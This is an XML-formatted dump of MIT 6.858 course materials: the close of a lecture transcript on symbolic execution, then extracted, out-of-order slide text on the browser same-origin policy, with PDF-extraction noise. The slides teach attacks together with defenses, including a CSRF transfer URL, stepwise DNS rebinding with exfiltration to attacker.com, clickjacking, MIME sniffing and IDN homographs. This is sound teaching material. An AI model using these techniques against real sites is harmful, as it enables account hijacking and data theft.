              <text_slice>But what's important
is that by relying</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:48</time_slice>
              <text_slice>on this theory of arrays,
using the same strategy we</text_slice>
            </slice>
            <slice>
              <time_slice>1:14:51</time_slice>
              <text_slice>saw to generate formulas for
integers you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:00</time_slice>
              <text_slice>generate formulas
involving array logic,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:03</time_slice>
              <text_slice>and involving array updates,
involving array axises,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:08</time_slice>
              <text_slice>involving iteration over arrays
as long as you fix your path,</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:16</time_slice>
              <text_slice>these formulas are
very easy to generate.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:21</time_slice>
              <text_slice>If you don't fix
your paths if you</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:22</time_slice>
              <text_slice>want to generate a
formula that corresponds</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:24</time_slice>
              <text_slice>to going through all paths,
then it's also relatively easy.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:29</time_slice>
              <text_slice>The Only thing is you
have to deal with loops</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:32</time_slice>
              <text_slice>in more of a special way.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:34</time_slice>
              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:35</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:43</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA:
I don't know.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:46</time_slice>
              <text_slice>So dictionaries and
maps are actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:48</time_slice>
              <text_slice>very easy to model using
uninterpreted functions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:52</time_slice>
              <text_slice>And, in fact, the
theory of arrays</text_slice>
            </slice>
            <slice>
              <time_slice>1:15:55</time_slice>
              <text_slice>itself, it's just a special
case of uninterpreted functions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:05</time_slice>
              <text_slice>So more complicated
things can be done</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:09</time_slice>
              <text_slice>with uninterpreted functions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:11</time_slice>
              <text_slice>In modern SMT solvers
there is native support</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:16</time_slice>
              <text_slice>for reasoning about
sets and set operations,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:20</time_slice>
              <text_slice>which can be very, very
useful if you're reasoning</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:22</time_slice>
              <text_slice>about a program that involves
lots of set computations,</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:28</time_slice>
              <text_slice>for example.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:30</time_slice>
              <text_slice>When designing
one of these tools</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:33</time_slice>
              <text_slice>the modeling step
is really important.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:36</time_slice>
              <text_slice>And it's not just how you model
complicated program features</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:41</time_slice>
              <text_slice>down to your theories.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:43</time_slice>
              <text_slice>So, for example, things
like heaps down to arrays.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:47</time_slice>
              <text_slice>And also the choice of what
theories and the solver you</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:50</time_slice>
              <text_slice>use.</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:51</time_slice>
              <text_slice>And there's a large number
of theories and the solver</text_slice>
            </slice>
            <slice>
              <time_slice>1:16:56</time_slice>
              <text_slice>with different trade offs
between how efficient they are</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:02</time_slice>
              <text_slice>versus how expressive they are.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:04</time_slice>
              <text_slice>And, in general, most
of the production tools</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:08</time_slice>
              <text_slice>stick to the theory
of bit-vectors</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:13</time_slice>
              <text_slice>and they might use
the theory of arrays</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:16</time_slice>
              <text_slice>to model the heap if
that is necessary.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:21</time_slice>
              <text_slice>Generally production
tools try to shy away</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:24</time_slice>
              <text_slice>from some of the more
sophisticated theories,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:27</time_slice>
              <text_slice>like the theory of sets
just because by virtue</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:31</time_slice>
              <text_slice>being richer they also tend to
be less scalable in some cases,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:36</time_slice>
              <text_slice>unless you're dealing with a
program that really requires</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:39</time_slice>
              <text_slice>exactly that kind of reasoning
in order to work with.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:44</time_slice>
              <text_slice>Are there other questions?</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:47</time_slice>
              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:48</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE] research
in symbolic execution,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:50</time_slice>
              <text_slice>what are people
focusing on and where</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:52</time_slice>
              <text_slice>is there room for improvement?</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:54</time_slice>
              <text_slice>[INAUDIBLE] applications.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:56</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: So one
very active area of research</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:00</time_slice>
              <text_slice>is around applications.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:02</time_slice>
              <text_slice>And looking at models
that will allow</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:06</time_slice>
              <text_slice>you to discover new
classes of bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:09</time_slice>
              <text_slice>So, for example, Nikolai,
and Franz, and Xi Wang and I</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:15</time_slice>
              <text_slice>had a paper, what
was it, last year</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:19</time_slice>
              <text_slice>when we were looking at using
symbolic execution to identify</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:23</time_slice>
              <text_slice>coding your program that a
compiler might optimize away.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:28</time_slice>
              <text_slice>Security checks that might get
optimized away by a compiler.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:32</time_slice>
              <text_slice>So it's very different from the
question of will the program go</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:38</time_slice>
              <text_slice>down this path or not, but
there is a modeling step</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:42</time_slice>
              <text_slice>to go from this high
level conceptual question</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:45</time_slice>
              <text_slice>of, is there a
code in my program</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:47</time_slice>
              <text_slice>that can be compiled away
to an algorithm based</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:54</time_slice>
              <text_slice>on symbolic execution
that will rely</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:56</time_slice>
              <text_slice>on the ability of
symbolic execution</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:58</time_slice>
              <text_slice>to easily tell you whether
the program can go down</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:01</time_slice>
              <text_slice>a particular path, or whether
a particular path is feasible.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:04</time_slice>
              <text_slice>So applications is a
big area, extending</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:08</time_slice>
              <text_slice>to newer classes
of bugs, growing</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:12</time_slice>
              <text_slice>to new and different
language features.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:15</time_slice>
              <text_slice>For example, one of the
things that is still</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:19</time_slice>
              <text_slice>fairly hard to model from
using symbolic execution</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:22</time_slice>
              <text_slice>are very high level languages,
like JavaScript or Python where</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:28</time_slice>
              <text_slice>you have a lot of very
dynamic language features,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:31</time_slice>
              <text_slice>but at the same time they
are-- if any technique can</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:37</time_slice>
              <text_slice>work for the symbolic execution,
it's definitely very good.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:40</time_slice>
              <text_slice>And, in fact, we had some
work a couple of years</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:44</time_slice>
              <text_slice>ago using symbolic
execution to reason</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:46</time_slice>
              <text_slice>about errors in Python
programming assignments,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:50</time_slice>
              <text_slice>for example.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:51</time_slice>
              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:52</time_slice>
              <text_slice>AUDIENCE: So [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:03</time_slice>
              <text_slice>How does [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:08</time_slice>
              <text_slice>ARMANDO SOLAR-LEZAMA: It is.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:09</time_slice>
              <text_slice>So in the case of symbolic
execution part of the problem</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:13</time_slice>
              <text_slice>is that your symbolic state,
it's very hard to simply say,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:19</time_slice>
              <text_slice>OK, I executed this
instruction, and then</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:21</time_slice>
              <text_slice>this instruction, and
then this instruction.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:23</time_slice>
              <text_slice>The sequence is not there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:24</time_slice>
              <text_slice>There was some work a few
years ago looking, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:28</time_slice>
              <text_slice>at very small pieces of
code, but very critical,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:31</time_slice>
              <text_slice>like a concurring data
structure in operating</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:35</time_slice>
              <text_slice>system, or lock-free
data structure</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:37</time_slice>
              <text_slice>and modeling the
interactions between threads</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:43</time_slice>
              <text_slice>by essentially saying, every
time there is a variable that</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:47</time_slice>
              <text_slice>could have been overwritten
by something else,</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:49</time_slice>
              <text_slice>you replace that value with
just a fresh symbolic value that</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:54</time_slice>
              <text_slice>says, I have no
idea what this is.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:55</time_slice>
              <text_slice>And you generate
constraints that</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:57</time_slice>
              <text_slice>relate to those symbolic
values to symbolic values</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:00</time_slice>
              <text_slice>in other threads.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:01</time_slice>
              <text_slice>And this has been
used even to reason</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:03</time_slice>
              <text_slice>about things like missing
memory fences, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:08</time_slice>
              <text_slice>And so it is possible, but the
complexity grows quite a bit.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:13</time_slice>
              <text_slice>And it becomes the kind of thing
that you cannot no longer do</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:18</time_slice>
              <text_slice>at the scale of Microsoft Word,
but you can do at the scale</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:22</time_slice>
              <text_slice>of, say, a concurring data
structure, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:26</time_slice>
              <text_slice>There had been other work though
in the context of concurrency</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:28</time_slice>
              <text_slice>looking at, for example,
can I use symbolic execution</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:31</time_slice>
              <text_slice>to reconstruct
interleavings based</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:34</time_slice>
              <text_slice>on knowledge of how the program
behaved as it was running,</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:38</time_slice>
              <text_slice>for example.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:40</time_slice>
              <text_slice>And so this opens a
lot of possibilities,</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:46</time_slice>
              <text_slice>having this capability to
ask very concrete questions</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:49</time_slice>
              <text_slice>about can my program
run down this path.</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:52</time_slice>
              <text_slice>Being able to have
symbolic values</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:54</time_slice>
              <text_slice>and ask questions, what values
should these things have</text_slice>
            </slice>
            <slice>
              <time_slice>1:21:57</time_slice>
              <text_slice>in order for the program to
do something, or in order</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:00</time_slice>
              <text_slice>something to happen is a
very powerful capability</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:03</time_slice>
              <text_slice>and there's a lot
of applications</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:04</time_slice>
              <text_slice>that have been tried, but
this is a fairly new piece</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:10</time_slice>
              <text_slice>of technology as
far as technology</text_slice>
            </slice>
            <slice>
              <time_slice>1:22:13</time_slice>
              <text_slice>for analyzing a program goes.</text_slice>
            </slice>
          </transcript>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Web Security Model (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec8/</lecture_pdf_url>
      <lectureno>8</lectureno>
      <slides>
        <slide>
          <slideno>3</slideno>
          <text>4.Passive	&#13; content (e.g., images and CSS)	&#13; can't execute	&#13; code, so this	&#13; content
isgiven zero	&#13; authority.
Returning to our example:
oThe Google	&#13; analytics	&#13; script and	&#13; the	&#13; jQuery script ca
n	&#13; access	&#13; all the
resources	&#13; belonging to
foo.com (e.g., they can read and write cookies,
attach event	&#13; handlers to buttons, manipulate the DOM tree, access
JavaScript variables,	&#13; etc.).
oJavaScript code in the Facebook frame has	&#13; no access	&#13; to	&#13; resources in the
foo.com frame, because the two frames have different origins.
The two
frames can only	&#13; talk via postMessage(), a JavaScript API that allows
domains to exchange immutable strings.
If the two frames *were* in the same origin, they	&#13; could	&#13; use
window.parent and window.frames[] to directly interact with	&#13; each	&#13; 
other's	&#13; Ja
vaScript state!
oJavaScript code in the Facebook frame cannot issue an	&#13; XMLHttpRequest
to foo.com's server [the network	&#13; is a r
esource	&#13; with an origin!]	&#13; . . .
oHowever, the Facebook frame *can* import scripts, CSS,	&#13; or images from
foo.com (although	&#13; that content ca
n	&#13; only	&#13; update theFacebook frame, since
the content inherits	&#13; the	&#13; authority	&#13; of the	&#13; Facebook origin, not foo.com
origin).
oThe browser	&#13; checks	&#13; the	&#13; type	&#13; of ad.gif, determines  that  ad.gif is  a image,
andconcludes that the image should receive no authority	&#13; at all.
What	&#13; happens i f	&#13; the browser mistakenly identifies the
MIME ty
pe of an object?
Old versions of IE used to do MIME sniffing.
oGoal:	&#13; Detect when	&#13; a web server has	&#13; given an incorrect	&#13; file extension	&#13; to an
object (e.g., foo.jpg
should actually be foo.html).
oMechanism:  IE looks at  the first  256  bytesof the file and looks for  magic
values which indicate a file type.	&#13; If there's a disagreement between the
magic values and the file extension,	&#13; IE trusts the file	&#13; extension.
oProblem: Suppose that a page includes some passive content (e.g.,	&#13; an
image) from an attacker-controlled domain. The victim
page thinks
that
it's	&#13; safe	&#13; to import passive content, but the attacker can intentionally	&#13; put
HTML+JavaScript in the image and execute code in the victim page!
Moral: Browsers are complex---adding a well-intentioned	&#13; feature may cause
subtle and unexpecte
d security	&#13; bugs.
Let's	&#13; take	&#13; a deeper	&#13; look at how the	&#13; brow
sersecures	&#13; various	&#13; resources.
Frame/window objects
Note: A frame object is a DOM node of type HTMLIFrameElement,	&#13; whereas	&#13; the
window	&#13; object is the alias for the global JavaScript namespace. Both objects have	&#13; 
referen
ces	&#13; to	&#13; each	&#13; other.
Get the origin of their frame's URLs
-OR-	&#13; 
4</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>the "free iPad" button, but makes it transparent! So, if the	&#13; user clicks	&#13; on
the "free iPad" button,	&#13; he'll actually "Like"	&#13; the attackers page on
Facebook.
Solutions
1)Frame-busting	&#13; code: Include JavaScript that prevents your page from
bei
ngincluded as a frame. Ex: if(top	&#13; != self)
2)Have	&#13; your	&#13; web server send	&#13; the	&#13; X -Frame-Options HTTP response	&#13; header.
This will instruct the browser not	&#13; to put your content	&#13; in a child frame.
What  about  frame  URLs  that  don't have an origin? 
Ex: file://foo.txt
about:blank
javascript:document.cookie="x "
Sometimes  the frame  is only accessible to other  frames  with	&#13; that protocol (e.g., 
file://).
 [Thi s	&#13; can	&#13; be	&#13; irritating	&#13; if you're debugging	&#13; a site and you want  to mix 
file:// and	&#13; http:// content].
Sometimes the frame is just inaccessible to all other origins (e.g.,	&#13; "about:
").
Sometimes  the origin  is inherited  from  whoever  created	&#13; the	&#13; URL (e.g.,
"javascri pt:").	&#13; This prevents  attacks  in which a attacker.com  creates  a frame  
belonging  to victim.com, and then navigates the victim frame  to a javascript: 
URL--we d
on't want  the JavaScript	&#13; to execute in	&#13; the context of victim.com!
Names can be used as an attack vector!
IDN: internationalized domain names (non-latin	&#13; letters
).
Supporting more languages is good, but now, it can be difficult	&#13; for users to
distinguish two domain names from each other.
	 *Ex: The
Cyrillic	&#13; "C"	&#13; character looks like the Latin "C" character!	&#13;  So, an attacker
can buy a domain like "cats.com" (with a Cyrillic	&#13; "C")	&#13; and
trick	&#13; users who
thought	&#13; that	&#13; they were going to "cats.com" (Latin "C").
Good example of how new features can undermine security assumptions.
Browser vendors thought	&#13; registrars will	&#13;  prohibit ambiguous names.
Registrars	&#13; thought browser vendors will	&#13; c
hange browser to do something
Plugins	&#13; often	&#13; have subtly-different security	&#13; policies
Java: Sort of uses the same-
origin	&#13; policy,	&#13; but Java code can set HTTP headers
(bad!	&#13; see "Content-Length" discussion), and in some cases, different hostnames
with the same IP
address are considered to share the same origin.
Flash:  Developers  place  a file called  crossdomain.xml  on their	&#13; web servers. That
file	&#13; specifies	&#13; which	&#13; origins can talk to	&#13; the	&#13; server via	&#13; Flash.
HTML5	&#13; 
introduces	&#13; a new screen -sharing	&#13; API: Once	&#13; 
the user gives permission, a site
can capture	&#13; the entire visible screen area and transmit it back
to the site's origin.
8</text>
        </slide>
        <slide>
          <slideno>9</slideno>
          <text>o 
and the  need for guessing .Only add	&#13; features in small,  clearlyn  defined quanta  with minimal  room  
for implementation  error  or interpretation mistakes---remove  ambiguity  
10</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>The web specs are incredibly long, very complex, occasionally	&#13; contradictory,	&#13; and
constantly	&#13; evolving.
oSo, browser
vendors	&#13; do something that roughly resembles the specs and
then	&#13; laugh about	&#13; it with their friends.
oIf you want to understand the horror,	&#13; go to quirksmode.org.
In this lecture,	&#13; we're	&#13; going to focus on the client-side	&#13; of a web application.	&#13; In	&#13;   
particular, we're going to focus on how to isolate content from  different  provider s 
that	&#13; has to reside within the same browser.
Big	&#13; difference between	&#13; a web	&#13; application	&#13; and a traditional	&#13; desktop	&#13; application:
the bits in a desktop application  typically  come  from  a single vendor	&#13; (e.g., 
Microsoft  or Apple  or TurboTax),	&#13; but a single	&#13; web application	&#13; contains content 
from  a bunch of different  principals!
+--------------------------------------------+ | +--------------------------------------+ |
| | ad.gif from ads.com | |
| +--------------------------------------+ |
| +-----------------+ +------------------+ |
| | Analytics .js | | 
jQuery.js  from | |
| | from google.com  | | from cdn.foo.com | |
| +-----------------+ +------------------+ |
| |
| HTML (text inputs, buttons) |
| |
| +--------------------------------------+ |
| | Inline .js from foo.com (defines | |
| | event handlers for HTML GUI inputs) | |
| +--------------------------------------+ |
|+------------------------------------------+|
|| frame: 
https://facebook.com/likeThis.html ||
|| ||
|| +----------------------+ +--------------+||
|| | Inline .js from | | f.jpg from https://
|| | https://facebook.com | | facebook.com ||| 
|| +----------------------+ +--------------+||
|| ||
|+------------------------------------------+|
| |
 
Question: Which pieces of JavaS cript code can access which pieces	&#13; of state? For
example
2</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>A: If an attacker controls a cookie, the attacker can force the	&#13; user to	&#13; use an
account	&#13; that's controlled	&#13; by	&#13; an attacker!
oEx: By controlling a Gmail cookie, an attacker can redirect a user to	&#13; an
attacker controlled account	&#13; and read any	&#13; emails
that are sent from that
account.
Q: Is it	&#13; valid for foo.co.uk	&#13; to set	&#13; a cookie's domain to co.uk?
A: This is valid according to the rules that we've discussed	&#13; so far,	&#13; but in practice,
we should disallow such a thing,	&#13; since	&#13; ".co.uk"	&#13; is semantically	&#13; a  single, "atomic"
domain	&#13; like	&#13; ".com". Mozilla  maintains  a public	&#13; list which	&#13; allows  browsers  to
determine  the	&#13; appropriate suffix rules for top-level
 domains.
[https://publicsuffix.org ]
HTTP responses:	&#13; Many	&#13; exceptions	&#13; and	&#13; half -exceptions	&#13; to same-origin	&#13; policy.
XMLHttpRequests: By default,	&#13; JavaScript	&#13; can only send XMLHttpReq uests to its
origin server unless the remote server has enabled Cross-
origin Resource	&#13; 
Sharing (CORS).	&#13; The scheme defines some new HTTP	&#13; response	&#13; headers:
oAccess-Control -Allow-Origin	&#13; speci fies	&#13; which origins can	&#13; see HTTP
response.
oAccess-Control -Allow-
Credentials	&#13; specifies if browser	&#13; should	&#13; accept
cookies in HTTP	&#13; request
from the foreign origin.
Images: A frame can load an image from any origin but it	&#13; can't	&#13; look	&#13; at the
image pixels but it	&#13; can determine the image's size.
CSS:	&#13; Similar story to
images--a frame can't directly read	&#13; the	&#13; content of external
CSS files, but
can infer some of its properties.
JavaScript: A frame can load JavaScript from any origin . . . but it can't directly
examine the source	&#13; code in a &lt;script
&gt;	&#13; tag/XMLHttpRequest response	&#13; body	&#13; . . .
but all JavaScript	&#13; functions have a public toString() method which reveals source	&#13; 
code and a page's home server can always fetch the source code directly	&#13; and
then pass it to the page!
oToprevent	&#13; reverse-engineering,	&#13; many sites minify and obfuscate their
JavaScript.
Plugins: A frame can run a plugin from any origin.
o&lt;embed src=...&gt; // Requires	&#13; plugin -sp
ecific elaborations.
Remember that, when the browser generates an HTTP	&#13; requ
est, it autom atically	&#13; 
includes	&#13; the	&#13; relevant cookies.
What happens if the browser creates a frame with a URL like
this?
ohttp://bank.com/xfer?amount=500&amp;to=attacker
This attack is called	&#13; a cross -site	&#13; request forgery (CSRF).
Solution: Include some random data in URLs that is difficult for the	&#13; attacker
to guess.	&#13; Ex:
&lt;form action="/transfer.cgi" ...&gt;
&lt;input type="hidden"
name="csrfToken" 
6</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858 Lecture 8
Web	&#13; Security
What  is the web?  In the old days, it was a simple client/server  architecture  (client 
was your web browser, server  was a machine
 on the  network that  could deliver  
static text  and images to your  browser).
In the old days,	&#13; the server-side	&#13; was much more complex than the client-side:
browsers didn't support rich interactivity,
but the server might interface with
dat
abases,other	&#13; servers, etc.
Because the server was so much more complicated, "web security" focused on
the server-side.	&#13; Up to this point, this class has largely	&#13; focused on the
server -side	&#13; 
as well	&#13; (e.g.,	&#13; buffer overflows on	&#13; web	&#13; servers,	&#13; privilege separation	&#13; in	&#13; the OKWSserver).
The web has changed: now the browser is very complicated.
JavaScript: Allows a page to execute client-side	&#13; code.
DOM model Provides a JavaScript interface to the page's HTML,	&#13; allowing the
page to add/remove tags, change
their styling, etc.
XMLHttpRequests	&#13; (AJAX): Asynchronous HTTP	&#13; requests.
Web	&#13; sockets: Full -
duplex client-server	&#13; communication over TCP.
Web	&#13; workers: Multi-thre
ading	&#13; support.
Multimedia support: &lt;video&gt;, web cams, screen-sharing.
Geolocation: Browser can determine your location by examining GPS units.
Firefox  can also locate  you by passing your  WiFi information  to the Google 
Location Service.
&lt;canvas&gt; and WebGL: Bitmap manipulation and interactive 2D/3D graphics.
Nacl: Allows browsers to run native code!
The web is now
a complex platform for distributed computation! But what does this
mean for security?
The threat surfa
ce	&#13; is huge!
A single web application now spans multiple programming languages,	&#13; OSes,
hardware platforms. I might be running Firefox on Windows	&#13; in
teracting with	&#13; a
Linux server running Apache and interfacing with memcached and MySQL).
All of this composition makes it difficult	&#13; to verify end -to-end	&#13; correctness,	&#13; or even
understand what the system is doing. Ex: Parsing contexts and content
sa
nitization.
&lt;script&gt; var x = 'UNTRUSTED'; &lt;/script&gt;
//Single quote breaks out of JS string
//context into JS context
//
//"&lt;/script&gt;" breaks out of JS context
//into HTML context
1</text>
        </slide>
        <slide>
          <slideno>10</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>value="a6dbe323..."/&gt;
 
	 Each time a user requests the page, the server generates	&#13; H TML	&#13; with	&#13; new
random tokens. When the user submits a request, the server validates the
token	&#13; bef
ore actually processing	&#13; the request.
	 Drawback: If each URL to the same object is unique, it's difficult	&#13; to cache that
object!
Network addresses almos t	&#13; have an origi
n.
	 A frame can send HTTP	&#13; *and* HTTPS	&#13; requests
to a host+port that match its
origin.
	 Note that the security of the same-origin	&#13; policy depends	&#13; on the	&#13; integrity	&#13; of the	&#13; 
DNS infrastructure!
	 DNS
rebinding attack
o	 Goal: Attacker wants to run attacker-controlled JavaScript code with	&#13; the	&#13; 
authority	&#13; of an o
rigin that he does not control (victim.com).
o	 Approach:
1) Attacker	&#13; registers a domain name (e.g., attacker.com) and creates
a DNS	&#13; server to res
pond to the relevant	&#13; queries.
2) User	&#13; visits the attacker.com website, e.g., by	&#13; clicking	&#13; on an	&#13; 
advertisement.
3) The	&#13; attacker	&#13; website	&#13; wants	&#13; to	&#13; downloads a single object,	&#13; but first,	&#13; 
the browser must
issue a DNS request for attacker.com. The
attacker's DNS	&#13; server responds with
a DNS	&#13; record to the attacker's
IP address. However,	&#13; the record has a short time-to -live.
4) The	&#13; attacker rebinds attacker.com to the IP address of victim.com.
5) A	&#13; bit later, the attacker website creates an XMLHttpReques
t	&#13; that	&#13; 
connects	&#13; to attacker.com. That request will actually be sent	&#13; to the
IP
address of victim.com! The browser won't complain because it
will	&#13; r
evalidate the DNS	&#13; record and see the new	&#13; binding.
6) Attacker	&#13; page can now exfiltrate data, e.g., using CORS	&#13; 
XMLHttpRequest	&#13; to the attacker domain.
o	 Solutions :	&#13; 
Modi
fy DNS	&#13; resolvers so that	&#13; external hostnames can never
resolve	&#13; to	&#13; internal IP addreses.
Brows
ers can pin	&#13; DNS	&#13; bindings,	&#13; regardless of their	&#13; TTL settings.	&#13; 
However, this may break web applications that use dynamic DNS
(e.g., for loa
d-balancing).
What	&#13; about	&#13; the pixels on	&#13; a screen?
	 They don't have	&#13; an origin! A frame can draw anywhere within	&#13; its bounding	&#13; box.
	 Problem: A parent frame can overlay content atop the
pixels of its child frames.
o	 Ex: At attacker creates a page which has an enticing	&#13; button	&#13; like "Click	&#13; 
here for a free iPad!" Atop that button,	&#13; the	&#13; pa
gecreates a child frame that
contains	&#13; the Facebook "Like" button. The attacker places that button atop
7</text>
        </slide>
        <slide>
          <slideno>8</slideno>
          <text>So, if an attacker page can convince the user to grant	&#13; screen -sharing	&#13; permission,
the attacker page can open an iframe to a sensitive site (e.g., banking,	&#13; Facebook,
email), and capture the screen	&#13; contents!
The iframe will send cookies, so the user will automatically be logged
in,
allowing	&#13; the attacker to see "real" information, not boring login	&#13; page stuff.
Attacker can make the iframe flash only briefly to prevent the user
from noticing
the mischief.
Possible	&#13; defenses:
oAllow users to only screen-share	&#13; part of the DOM
tree? It seems like this
will	&#13; be tedious
and error -prone.
oOnly allow	&#13; an origin	&#13; to scree
n-capture content from its own origin?
Seems like a more reasonable approach, although it prevents
"The Tangl ed	&#13; Web,"	&#13; there	&#13; have	&#13; been	&#13; various	&#13; modifications and additions to
the aggregate web stack.
In general, things have gotten more complicated, which is typically bad for
security.
For reference, here are some of the new features:
ohttp://en.wikipedia.org/wiki/Content_Security_Policy
ohttp://en.wikipedia.org/wiki/Strict_Transport_Security
ohttp://en.wikipedia.org/wiki/Cross origin_resource_sharing
oHTML5 iframe sandbox attribute [http://msdn.microsoft.com/enn
us/hh563496.aspx]
Thebrowser security model is obviously a mess. It's very complex and contains a lot
